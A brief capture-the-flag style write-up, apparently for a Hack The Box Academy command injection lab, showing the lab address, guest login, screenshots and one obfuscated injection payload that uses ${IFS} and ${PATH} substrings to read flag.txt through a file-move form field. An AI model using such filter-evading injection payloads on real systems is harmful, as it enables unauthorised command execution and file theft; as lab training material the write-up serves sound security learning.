# IP: 94.237.50.202:41866
# Auth: guest/guest
We can see the injection is in the move file
![Move](../Img/skillcomand.png)

![BURP](../Img/skillcomadn2.png)
And in the section form we must to change for us payload:
`%3bc'a't${IFS}${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH: 0:1}..${PATH:0:1}flag.txt;`
![flag](../Img/skillflag.png)

https://academy.hackthebox.com/achievement/349590/109
